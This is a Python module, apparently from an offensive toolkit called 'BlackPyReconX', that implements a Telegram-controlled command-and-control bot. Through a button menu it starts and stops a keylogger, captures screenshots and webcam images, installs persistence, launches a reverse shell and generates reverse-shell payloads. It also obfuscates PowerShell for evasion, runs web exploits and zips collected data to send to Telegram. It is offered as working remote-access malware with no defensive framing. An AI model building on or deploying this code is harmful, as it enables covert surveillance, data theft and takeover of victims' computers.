# modules/telegram_bot.py

import os
import json
import time
import threading
import requests
from modules import utils


from modules import (
    osint, scanner, exploit_sys, reporting, exfiltration,
    persistence, crypto_tools, evasion, exploit_web
)

TOKEN = ""
CHAT_ID = ""
config = {}
user_states = {}

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

def send_file(file_path, caption="📄 Fichier"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f)}
            data = {"chat_id": CHAT_ID, "caption": caption}
            requests.post(url, files=files, data=data)

def log_action(text):
    print(f"[LOG] {text}")
    send_message(f"📝 {text}")

def build_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔍 OSINT", "callback_data": "osint"}],
            [{"text": "🔎 Scan", "callback_data": "scan"}],
            [{"text": "⚔️ Full Scan", "callback_data": "fullscan"}],
            [{"text": "🕷️ Exploit Web", "callback_data": "exploit_web"}],
            [{"text": "📄 Rapport", "callback_data": "report"}],
            [{"text": "📦 Exfiltration", "callback_data": "exfil"}],
            [{"text": "🔐 Crypto Tools", "callback_data": "crypto"}],
            [{"text": "🫥 Evasion", "callback_data": "evasion"}],
            [{"text": "📌 Persistance", "callback_data": "persist"}],
            [{"text": "🧹 Clean Persist", "callback_data": "clean"}],
            [{"text": "🎹 Keylog", "callback_data": "keylog"}],
            [{"text": "🛑 Stop Keylog", "callback_data": "stop_keylog"}],
            [{"text": "📸 Screenshot", "callback_data": "screenshot"}],
            [{"text": "🎥 Camera", "callback_data": "camera"}],
            [{"text": "🐚 Shell", "callback_data": "shell"}],
            [{"text": "🗑️ Clear Logs", "callback_data": "clear_logs"}],
            [{"text": "❓ Help", "callback_data": "help"}]
        ]
    }

def handle_callback(action):
    if action in ["osint", "scan", "fullscan"]:
        send_message(f"💡 Entrez l'adresse IP pour {action.upper()}.")
        user_states[CHAT_ID] = f"awaiting_{action}_ip"

    elif action == "exploit_web":
        send_message("🌐 Entrez l'adresse IP ou domaine cible pour Exploit Web.")
        user_states[CHAT_ID] = "awaiting_exploit_web_ip"

    elif action == "report":
        log_action("📄 Génération du rapport...")
        reporting.generate_report()
        send_file("outputs/rapport_final.pdf", "🧾 Rapport Final")

    elif action == "exfil":
        log_action("📦 Création de l'archive...")
        zip_path = exfiltration.create_zip()
        exfiltration.send_via_telegram(config, zip_path)

    elif action == "crypto":
        send_message("🔐 Entrez le texte à hacher/chiffrer :")
        user_states[CHAT_ID] = "awaiting_crypto_input"

    elif action == "evasion":
        send_message("🫥 Entrez une commande PowerShell à obfusquer ou tapez 'reverse <ip> <port>'")
        user_states[CHAT_ID] = "awaiting_evasion_input"

    elif action == "persist":
        log_action("📌 Mise en place de la persistance...")
        persistence.run(silent=True)
        log_action("✅ Persistance ajoutée.")

    elif action == "clean":
        log_action("🧹 Suppression de la persistance...")
        persistence.clean()
        log_action("✅ Persistance supprimée.")

    elif action == "keylog":
        log_action("🎹 Keylogger démarré...")
        exploit_sys.start_keylogger()
        send_message("✅ Keylogger en cours. Fichier : keylog.txt")

    elif action == "stop_keylog":
        log_action("🛑 Arrêt du keylogger...")
        exploit_sys.stop_keylogger()
        send_message("✅ Keylogger arrêté.")
        if os.path.exists(exploit_sys.KEYLOG_FILE):
            send_file(exploit_sys.KEYLOG_FILE, "📝 Fichier Keylog")

    elif action == "screenshot":
        log_action("📸 Capture d'écran...")
        exploit_sys.take_screenshot()
        send_file(exploit_sys.SCREENSHOT_FILE, "🖼️ Screenshot")

    elif action == "camera":
        log_action("🎥 Capture webcam...")
        exploit_sys.capture_camera()
        send_file(exploit_sys.CAMERA_FILE, "📷 Webcam")

    elif action == "shell":
        log_action("🐚 Reverse shell démarré (127.0.0.1:4444)...")
        threading.Thread(target=exploit_sys.start_reverse_shell, args=("127.0.0.1", 4444)).start()

    elif action == "clear_logs":
        message = utils.clear_outputs()
        send_message(message)


    elif action == "help":
        send_message("Utilise les boutons ci-dessous pour les actions. Tape /start pour les revoir.")

def handle_text(chat_id, text):
    state = user_states.get(chat_id)

    if state == "awaiting_osint_ip":
        log_action(f"🔍 OSINT en cours sur {text}")
        result = osint.run(text, config)
        send_message(result[:4096])
        send_message("✅ OSINT terminé.")
        user_states.pop(chat_id)

    elif state == "awaiting_scan_ip":
        log_action(f"🔎 Scan en cours sur {text}")
        try:
            result = scanner.run(text)
            for i in range(0, len(result), 4000):
                send_message(result[i:i+4000])
            send_message("✅ Scan terminé.")
        except Exception as e:
            send_message(f"❌ Erreur Scan : {e}")
        user_states.pop(chat_id)

    elif state == "awaiting_fullscan_ip":
        log_action(f"⚔️ Full Scan sur {text}...")
        try:
            osint.run(text, config)
            scanner.run(text)
            reporting.generate_report()
            send_file("outputs/rapport_final.pdf", "📄 Rapport")
            zip_path = exfiltration.create_zip()
            exfiltration.send_via_telegram(config, zip_path)
            send_message("✅ Full scan terminé.")
        except Exception as e:
            send_message(f"❌ Erreur Full Scan : {e}")
        user_states.pop(chat_id)

    elif state == "awaiting_crypto_input":
        hashes = crypto_tools.hash_text(text)
        aes_encrypted = crypto_tools.aes_encrypt(text)
        result = "🔐 Crypto Tools Results\n"
        result += f"• MD5: `{hashes['MD5']}`\n"
        result += f"• SHA1: `{hashes['SHA1']}`\n"
        result += f"• SHA256: `{hashes['SHA256']}`\n"
        result += f"• AES (base64): `{aes_encrypted}`"
        send_message(result)
        user_states.pop(chat_id)

    elif state == "awaiting_evasion_input":
        if text.lower().startswith("reverse"):
            try:
                _, ip, port = text.split()
                payload = evasion.generate_reverse_shell(ip, int(port))
                send_message(f"🐚 Reverse Shell (base64) :\n`{payload}`")
            except:
                send_message("❌ Format : reverse <ip> <port>")
        else:
            obfuscated = evasion.obfuscate_powershell(text)
            encoded = evasion.encode_base64(text)
            result = "🫥 Evasion Tools\n"
            result += f"• Base64 Encoded:\n`{encoded}`\n\n"
            result += f"• Obfuscated PowerShell:\n`{obfuscated}`"
            send_message(result)
        user_states.pop(chat_id)

    elif state == "awaiting_exploit_web_ip":
        log_action(f"🕷️ Exploitation Web sur {text}")
        try:
            exploit_web.run(text)
            if os.path.exists("outputs/web_vulns.txt"):
                with open("outputs/web_vulns.txt", "r", encoding="utf-8") as f:
                    summary = f.read()
                send_message("🕷️ Vulnérabilités détectées :\n" + summary[:4000])
                send_file("outputs/web_vulns.txt", "📄 Détails Exploitation Web")
            else:
                send_message("✅ Aucune vulnérabilité détectée.")
        except Exception as e:
            send_message(f"❌ Erreur Exploit Web : {e}")
        user_states.pop(chat_id)

    else:
        send_message("❗Commande non reconnue. Tape /start.")

def start_bot(config_data):
    global TOKEN, CHAT_ID, config
    TOKEN = config_data.get("telegram_bot_token")
    CHAT_ID = config_data.get("telegram_chat_id")
    config = config_data

    authorized_users = config.get("authorized_users", [str(CHAT_ID)])

    if not TOKEN or not CHAT_ID:
        print("[!] Token/chat_id manquant dans config.json")
        return

    print("[*] Bot Telegram prêt. Attente de commandes...")
    offset = None

    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            if offset:
                url += f"?offset={offset + 1}"
            r = requests.get(url)
            updates = r.json().get("result", [])

            for update in updates:
                offset = update["update_id"]

                message = update.get("message")
                if message:
                    chat_id = str(message["chat"]["id"])
                    if chat_id not in [str(uid) for uid in authorized_users]:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                      data={"chat_id": chat_id, "text": "⛔ Accès refusé."})
                        continue

                    text = message.get("text", "")
                    if text == "/start":
                        keyboard = build_main_menu()
                        requests.post(
                            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                            data={
                                "chat_id": CHAT_ID,
                                "text": "👋 Bienvenue dans BlackPyReconX. Que veux-tu faire ?",
                                "reply_markup": json.dumps(keyboard)
                            }
                        )
                    elif text:
                        handle_text(chat_id, text)

                callback = update.get("callback_query")
                if callback:
                    callback_data = callback["data"]
                    threading.Thread(target=handle_callback, args=(callback_data,)).start()
                    requests.post(
                        f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
                        data={"callback_query_id": callback["id"]}
                    )

        except Exception as e:
            print(f"[!] Erreur bot : {e}")
            time.sleep(5)

        time.sleep(1)
